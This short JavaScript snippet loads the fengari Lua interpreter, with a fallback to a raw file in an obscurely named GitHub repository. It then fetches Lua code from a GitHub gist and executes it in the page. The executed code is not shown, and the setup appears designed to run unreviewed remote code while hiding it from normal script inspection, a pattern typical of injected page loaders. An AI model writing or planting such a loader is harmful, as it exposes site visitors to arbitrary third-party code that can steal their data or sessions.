const cdnSources = [
    'https://cdn.jsdelivr.net/npm/fengari-web@0.1.4/dist/fengari-web.js',
    'https://unpkg.com/fengari-web@0.1.4/dist/fengari-web.js',
    'https://raw.githubusercontent.com/gm92342/sdhiabfkgcnf/refs/heads/main/fengari-web.js'
];
function loadFengari(sources, index = 0) {
    if (index >= sources.length) {
        return;
    }
    const script = document.createElement('script');
    script.src = sources[index];
    script.onload = () => {
        fetch('https://gist.githubusercontent.com/gm92342/e955ad835c317932434a9a561cad1f5e/raw/0be0e97513560083fbaa4c5a749db6c9e7649c05/script.js')
            .then(response => response.text())
            .then(luaCode => {
                fengari.load(luaCode)();
            });
    };
    script.onerror = () => {
        loadFengari(sources, index + 1);
    };
    document.head.appendChild(script);
}
loadFengari(cdnSources);
